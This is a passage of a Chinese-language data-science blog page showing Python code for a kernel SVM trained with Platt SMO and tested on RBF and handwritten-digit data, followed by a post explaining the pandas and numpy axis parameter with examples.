<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#修改用到核函数的辅助函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcEk</span><span class="params">(oS, k)</span>:</span></span><br><span class="line">    fXk = float(multiply(oS.alphas,oS.labelMat).T*oS.K[:,k] + oS.b)</span><br><span class="line">    Ek = fXk - float(oS.labelMat[k])</span><br><span class="line">    <span class="keyword">return</span> Ek</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">innerLk</span><span class="params">(i, oS)</span>:</span></span><br><span class="line">    Ei = calcEk(oS, i)</span><br><span class="line">    <span class="keyword">if</span> ((oS.labelMat[i]*Ei &lt; -oS.tol) <span class="keyword">and</span> (oS.alphas[i] &lt; oS.C)) <span class="keyword">or</span> ((oS.labelMat[i]*Ei &gt; oS.tol) <span class="keyword">and</span> (oS.alphas[i] &gt; <span class="number">0</span>)):</span><br><span class="line">        j,Ej = selectJ(i, oS, Ei) <span class="comment">#this has been changed from selectJrand</span></span><br><span class="line">        alphaIold = oS.alphas[i].copy(); alphaJold = oS.alphas[j].copy();</span><br><span class="line">        <span class="keyword">if</span> (oS.labelMat[i] != oS.labelMat[j]):</span><br><span class="line">            L = max(<span class="number">0</span>, oS.alphas[j] - oS.alphas[i])</span><br><span class="line">            H = min(oS.C, oS.C + oS.alphas[j] - oS.alphas[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            L = max(<span class="number">0</span>, oS.alphas[j] + oS.alphas[i] - oS.C)</span><br><span class="line">            H = min(oS.C, oS.alphas[j] + oS.alphas[i])</span><br><span class="line">        <span class="keyword">if</span> L==H: </span><br><span class="line">            <span class="comment">#print("L==H"); </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        eta = <span class="number">2.0</span> * oS.K[i,j] - oS.K[i,i] - oS.K[j,j] <span class="comment">#changed for kernel</span></span><br><span class="line">        <span class="keyword">if</span> eta &gt;= <span class="number">0</span>: </span><br><span class="line">            <span class="comment">#print("eta&gt;=0"); </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        oS.alphas[j] -= oS.labelMat[j]*(Ei - Ej)/eta</span><br><span class="line">        oS.alphas[j] = clipAlpha(oS.alphas[j],H,L)</span><br><span class="line">        updateEk(oS, j) <span class="comment">#added this for the Ecache</span></span><br><span class="line">        <span class="keyword">if</span> (abs(oS.alphas[j] - alphaJold) &lt; <span class="number">0.00001</span>):</span><br><span class="line">            <span class="comment">#print("j not moving enough"); </span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        oS.alphas[i] += oS.labelMat[j]*oS.labelMat[i]*(alphaJold - oS.alphas[j])<span class="comment">#update i by the same amount as j</span></span><br><span class="line">        updateEk(oS, i) <span class="comment">#added this for the Ecache                    #the update is in the oppostie direction</span></span><br><span class="line">        b1 = oS.b - Ei- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i,i] - oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[i,j]</span><br><span class="line">        b2 = oS.b - Ej- oS.labelMat[i]*(oS.alphas[i]-alphaIold)*oS.K[i,j]- oS.labelMat[j]*(oS.alphas[j]-alphaJold)*oS.K[j,j]</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt; oS.alphas[i]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[i]): oS.b = b1</span><br><span class="line">        <span class="keyword">elif</span> (<span class="number">0</span> &lt; oS.alphas[j]) <span class="keyword">and</span> (oS.C &gt; oS.alphas[j]): oS.b = b2</span><br><span class="line">        <span class="keyword">else</span>: oS.b = (b1 + b2)/<span class="number">2.0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">smoPk</span><span class="params">(dataMatIn, classLabels, C, toler, maxIter,kTup=<span class="params">(<span class="string">'lin'</span>, <span class="number">0</span>)</span>)</span>:</span>    <span class="comment">#full Platt SMO</span></span><br><span class="line">    oS = optStructk(mat(dataMatIn),mat(classLabels).transpose(),C,toler, kTup)</span><br><span class="line">    iter = <span class="number">0</span></span><br><span class="line">    entireSet = <span class="literal">True</span>; alphaPairsChanged = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> (iter &lt; maxIter) <span class="keyword">and</span> ((alphaPairsChanged &gt; <span class="number">0</span>) <span class="keyword">or</span> (entireSet)):</span><br><span class="line">        alphaPairsChanged = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> entireSet:   <span class="comment">#go over all</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(oS.m):        </span><br><span class="line">                alphaPairsChanged += innerLk(i,oS)</span><br><span class="line">                <span class="comment">#print("fullSet, iter: %d i:%d, pairs changed %d" % (iter,i,alphaPairsChanged))</span></span><br><span class="line">            print(<span class="string">"fullSet, iter: %d , pairs changed %d"</span> % (iter,alphaPairsChanged))</span><br><span class="line">            iter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#go over non-bound (railed) alphas</span></span><br><span class="line">            nonBoundIs = nonzero((oS.alphas.A &gt; <span class="number">0</span>) * (oS.alphas.A &lt; C))[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> nonBoundIs:</span><br><span class="line">                alphaPairsChanged += innerLk(i,oS)</span><br><span class="line">                <span class="comment">#print("non-bound, iter: %d i:%d, pairs changed %d" % (iter,i,alphaPairsChanged))</span></span><br><span class="line">            print(<span class="string">"non-bound, iter: %d , pairs changed %d"</span> % (iter,alphaPairsChanged))</span><br><span class="line">            iter += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> entireSet: entireSet = <span class="literal">False</span> <span class="comment">#toggle entire set loop</span></span><br><span class="line">        <span class="keyword">elif</span> (alphaPairsChanged == <span class="number">0</span>): entireSet = <span class="literal">True</span>  </span><br><span class="line">        print(<span class="string">"iteration number: %d"</span> % iter)</span><br><span class="line">    <span class="keyword">return</span> oS.b,oS.alphas</span><br></pre></td></tr></table></figure>
<p>$f(x) = \sum\limits_{i=1}^m\alpha_i^*y_iK(x\cdot x_i) + b^*$</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testRbf</span><span class="params">(k1=<span class="number">1.3</span>)</span>:</span></span><br><span class="line">    dataArr,labelArr = loadDataset(<span class="string">'../../Downloads/machinelearninginaction/Ch06/testSetRBF.txt'</span>)</span><br><span class="line">    b,alphas = smoPk(dataArr, labelArr, <span class="number">200</span>, <span class="number">0.0001</span>, <span class="number">10000</span>, (<span class="string">'rbf'</span>, k1)) <span class="comment">#C=200 important</span></span><br><span class="line">    datMat=mat(dataArr); labelMat = mat(labelArr).transpose()</span><br><span class="line">    <span class="comment">#得到支持向量的索引</span></span><br><span class="line">    svInd=nonzero(alphas.A&gt;<span class="number">0</span>)[<span class="number">0</span>] <span class="comment">#[0]是因为alphas是一个mat，[1]是都是0的array</span></span><br><span class="line">    sVs=datMat[svInd] <span class="comment">#get matrix of only support vectors</span></span><br><span class="line">    labelSV = labelMat[svInd];</span><br><span class="line">    print(<span class="string">"there are %d Support Vectors"</span> % shape(sVs)[<span class="number">0</span>])</span><br><span class="line">    m,n = shape(datMat)</span><br><span class="line">    errorCount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        <span class="comment">#除了支持向量的a都是0，只需要计算支持向量的核函数</span></span><br><span class="line">        kernelEval = kernelTrans(sVs,datMat[i,:],(<span class="string">'rbf'</span>, k1)) <span class="comment">#计算支持向量与数据的和函数，(shape(sVs)[0],1)     </span></span><br><span class="line">        predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b <span class="comment">#(1,i) * (i,1) =&gt;(1,1)</span></span><br><span class="line">        <span class="keyword">if</span> sign(predict)!=sign(labelArr[i]): errorCount += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"the training error rate is: %f"</span> % (float(errorCount)/m))</span><br><span class="line">    dataArr,labelArr = loadDataset(<span class="string">'../../Downloads/machinelearninginaction/Ch06/testSetRBF2.txt'</span>)</span><br><span class="line">    errorCount = <span class="number">0</span></span><br><span class="line">    datMat=mat(dataArr); labelMat = mat(labelArr).transpose()</span><br><span class="line">    m,n = shape(datMat)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        kernelEval = kernelTrans(sVs,datMat[i,:],(<span class="string">'rbf'</span>, k1))</span><br><span class="line">        predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b</span><br><span class="line">        <span class="keyword">if</span> sign(predict)!=sign(labelArr[i]): errorCount += <span class="number">1</span>    </span><br><span class="line">    print(<span class="string">"the test error rate is: %f"</span> % (float(errorCount)/m) )</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testRbf()</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 30
iteration number: 1
non-bound, iter: 1 , pairs changed 5
iteration number: 2
non-bound, iter: 2 , pairs changed 2
iteration number: 3
non-bound, iter: 3 , pairs changed 0
iteration number: 4
fullSet, iter: 4 , pairs changed 0
iteration number: 5
there are 29 Support Vectors
the training error rate is: 0.130000
the test error rate is: 0.150000
</code></pre><p>$\sigma$ 如果太小，会得到很多支持向量，因为各支持向量的影响会变小，所以需要更多支持向量，但是容易过拟合</p>
<p>$\sigma $如果过大，则支持向量变小，容易欠拟合</p>
<h3 id="手写识别问题回顾"><a href="#手写识别问题回顾" class="headerlink" title="手写识别问题回顾"></a>手写识别问题回顾</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">img2vector</span><span class="params">(filename)</span>:</span></span><br><span class="line">    returnVect = zeros((<span class="number">1</span>,<span class="number">1024</span>))</span><br><span class="line">    fr = open(filename)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        lineStr = fr.readline()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            returnVect[<span class="number">0</span>,<span class="number">32</span>*i+j] = int(lineStr[j])</span><br><span class="line">    <span class="keyword">return</span> returnVect</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loadImages</span><span class="params">(dirName)</span>:</span></span><br><span class="line">    <span class="keyword">from</span> os <span class="keyword">import</span> listdir</span><br><span class="line">    hwLabels = []</span><br><span class="line">    trainingFileList = listdir(dirName)           <span class="comment">#load the training set</span></span><br><span class="line">    m = len(trainingFileList)</span><br><span class="line">    trainingMat = zeros((m,<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        fileNameStr = trainingFileList[i]</span><br><span class="line">        fileStr = fileNameStr.split(<span class="string">'.'</span>)[<span class="number">0</span>]     <span class="comment">#take off .txt</span></span><br><span class="line">        classNumStr = int(fileStr.split(<span class="string">'_'</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> classNumStr == <span class="number">9</span>: hwLabels.append(<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">else</span>: hwLabels.append(<span class="number">1</span>)</span><br><span class="line">        trainingMat[i,:] = img2vector(<span class="string">'%s/%s'</span> % (dirName, fileNameStr))</span><br><span class="line">    <span class="keyword">return</span> trainingMat, hwLabels    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testDigits</span><span class="params">(kTup=<span class="params">(<span class="string">'rbf'</span>, <span class="number">10</span>)</span>)</span>:</span></span><br><span class="line">    dataArr,labelArr = loadImages(<span class="string">'../../Downloads/machinelearninginaction/Ch06/digits/trainingDigits'</span>)</span><br><span class="line">    b,alphas = smoPk(dataArr, labelArr, <span class="number">200</span>, <span class="number">0.0001</span>, <span class="number">10000</span>, kTup)</span><br><span class="line">    datMat=mat(dataArr); labelMat = mat(labelArr).transpose()</span><br><span class="line">    svInd=nonzero(alphas.A&gt;<span class="number">0</span>)[<span class="number">0</span>]</span><br><span class="line">    sVs=datMat[svInd] </span><br><span class="line">    labelSV = labelMat[svInd];</span><br><span class="line">    print(<span class="string">"there are %d Support Vectors"</span> % shape(sVs)[<span class="number">0</span>])</span><br><span class="line">    m,n = shape(datMat)</span><br><span class="line">    errorCount = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        kernelEval = kernelTrans(sVs,datMat[i,:],kTup)</span><br><span class="line">        predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b</span><br><span class="line">        <span class="keyword">if</span> sign(predict)!=sign(labelArr[i]): errorCount += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"the training error rate is: %f"</span> % (float(errorCount)/m))</span><br><span class="line">    dataArr,labelArr = loadImages(<span class="string">'../../Downloads/machinelearninginaction/Ch06/digits/testDigits'</span>)</span><br><span class="line">    errorCount = <span class="number">0</span></span><br><span class="line">    datMat=mat(dataArr); labelMat = mat(labelArr).transpose()</span><br><span class="line">    m,n = shape(datMat)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        kernelEval = kernelTrans(sVs,datMat[i,:],kTup)</span><br><span class="line">        predict=kernelEval.T * multiply(labelSV,alphas[svInd]) + b</span><br><span class="line">        <span class="keyword">if</span> sign(predict)!=sign(labelArr[i]): errorCount += <span class="number">1</span>    </span><br><span class="line">    print(<span class="string">"the test error rate is: %f"</span> % (float(errorCount)/m))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testDigits()</span><br></pre></td></tr></table></figure>
<pre><code>fullSet, iter: 0 , pairs changed 104
iteration number: 1
non-bound, iter: 1 , pairs changed 11
iteration number: 2
non-bound, iter: 2 , pairs changed 0
iteration number: 3
fullSet, iter: 3 , pairs changed 0
iteration number: 4
there are 115 Support Vectors
the training error rate is: 0.000000
the test error rate is: 0.016129
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/03/06/pandas-axis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/06/pandas-axis/" itemprop="url">pandas-axis</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-06T21:16:45+08:00">
                2019-03-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Data-Science/" itemprop="url" rel="index">
                    <span itemprop="name">Data Science</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="axis"><a href="#axis" class="headerlink" title="axis "></a>axis </h1><p>轴用来为超过一维的数组定义的属性，二维数据拥有两个轴：第0轴沿着行的垂直往下，第1<br>轴沿着列的方向水平延伸。 逐行即把每一行延伸下来的一列当做一组<br>逐列即把每一列延伸下来的一行当做一组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(np.arange(<span class="number">12</span>).reshape((<span class="number">3</span>,<span class="number">4</span>)),index =[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>],</span><br><span class="line">                  columns =[<span class="string">'one'</span>,<span class="string">'two'</span>,<span class="string">'three'</span>,<span class="string">'four'</span>] )</span><br><span class="line">print(df)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">:    one  two  three  four</span><br><span class="line">: a    0    1      2     3</span><br><span class="line">: b    4    5      6     7</span><br><span class="line">: c    8    9     10    11</span><br></pre></td></tr></table></figure>
<h2 id="sum等操作"><a href="#sum等操作" class="headerlink" title="sum等操作 "></a>sum等操作 </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print(df.sum()) <span class="comment">#默认是0，逐行向下，所以是沿着列计算的</span></span><br><span class="line">print()</span><br><span class="line">print(df.sum(<span class="number">1</span>))<span class="comment">#axis = 1的操作，沿着列向右做计算的，所以是各行的计算</span></span><br></pre></td></tr></table></figure>
<h2 id="drop等的计算"><a href="#drop等的计算" class="headerlink" title="drop等的计算 "></a>drop等的计算 </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(df.drop(<span class="string">'four'</span>,axis = <span class="number">1</span>)) <span class="comment">#沿着列丢弃four</span></span><br><span class="line">print(df.drop(<span class="string">'c'</span>,axis = <span class="number">0</span>)) <span class="comment">#沿着行丢弃c</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">:    one  two  three</span><br><span class="line">: a    0    1      2</span><br><span class="line">: b    4    5      6</span><br><span class="line">: c    8    9     10</span><br><span class="line">:    one  two  three  four</span><br><span class="line">: a    0    1      2     3</span><br><span class="line">: b    4    5      6     7</span><br></pre></td></tr></table></figure>
<h2 id="plus拼接"><a href="#plus拼接" class="headerlink" title="plus拼接 "></a>plus拼接 </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">df1 = df.reset_index().copy()</span><br><span class="line">df2 =df.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment">#merge</span></span><br><span class="line">merged = df1.merge(df.reset_index(), on=<span class="string">'index'</span>)</span><br><span class="line">print(merged)  <span class="comment">#横向连接,即axis = 1默认是内连接，</span></span><br><span class="line">merged_index = df1.merge(df,right_index = <span class="literal">True</span>,left_on=<span class="string">'index'</span>)</span><br><span class="line">print(merged_index) <span class="comment">#即df1的index列和df的index连接</span></span><br><span class="line">merged_all_Index = df2.merge(df,right_index = <span class="literal">True</span>,left_index = <span class="literal">True</span> )</span><br><span class="line">print(merged_all_Index)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#numpy的concatenate axis = 1即横向连接，axis=0即竖向连接,默认axis=0</span></span><br><span class="line">arr = np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">print(arr)</span><br><span class="line">print(np.concatenate([arr,arr]))</span><br><span class="line">print(<span class="string">'axis = 1'</span>)</span><br><span class="line">print(np.concatenate([arr,arr],axis = <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pd.concat axis=0默认，即竖向连接，axis=1是横向，默认是outer连接</span></span><br><span class="line">print(pd.concat([df,df]))</span><br><span class="line">print(<span class="string">'axis =1 '</span>)</span><br><span class="line">print(pd.concat([df,df],axis =<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
<h2 id="add-div等操作"><a href="#add-div等操作" class="headerlink" title="add/div等操作 "></a>add/div等操作 </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#axis =0 的情况，即逐行的以组series</span></span><br><span class="line"><span class="comment">#因为df是 3*4的，所以要一个长度3的数组</span></span><br><span class="line">print(df.add(np.arange(<span class="number">3</span>),axis=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#axis = 1的情况， 即逐列的一组数组， 默认axis = 1</span></span><br><span class="line">print(df.add(np.arange(<span class="number">4</span>)))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#+RESULTS:</span><br><span class="line">:    one  two  three  four</span><br><span class="line">: a    0    1      2     3</span><br><span class="line">: b    5    6      7     8</span><br><span class="line">: c   10   11     12    13</span><br><span class="line">:    one  two  three  four</span><br><span class="line">: a    0    2      4     6</span><br><span class="line">: b    4    6      8    10</span><br><span class="line">: c    8   10     12    14</span><br></pre></td></tr></table></figure>
<h2 id="聚合groupby"><a href="#聚合groupby" class="headerlink" title="聚合groupby "></a>聚合groupby </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#groupby 默认按照axis=0 也可以axis=1聚合</span></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">'key1'</span> : [<span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>],</span><br><span class="line">                   <span class="string">'key2'</span> : [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>],</span><br><span class="line">                   <span class="string">'data1'</span> : np.random.randn(<span class="number">5</span>),</span><br><span class="line">                   <span class="string">'data2'</span> : np.random.randn(<span class="number">5</span>)&#125;)</span><br><span class="line">print(df)</span><br><span class="line"><span class="comment">#axis = 0即对于列key，划分数据，列1里，0，1，4为a,其他列同理；按照行分来</span></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> df.groupby(<span class="string">'key1'</span>,axis =<span class="number">0</span>):</span><br><span class="line">    print(a)</span><br><span class="line">    print(b)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">print(<span class="string">'-----axis=1的情况----------'</span>)</span><br><span class="line"><span class="comment">#axis = 1 即对着列分割，每一行按照key进行分割，整体看来是按照列 分割</span></span><br><span class="line"><span class="comment">#object就是第一和第二列，float64即后面两列</span></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> df.groupby(df.dtypes, axis =<span class="number">1</span>):</span><br><span class="line">    print(a)</span><br><span class="line">    print(b)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://yueyec.github.io/2019/03/03/python2-for-data-analysis/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yueyec">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yueyec's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/03/python2-for-data-analysis/" itemprop="url">python2-for-data-analysis</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T21:13:28+08:00">
                2019-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Data-Science/" itemprop="url" rel="index">
                    <span itemprop="name">Data Science</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
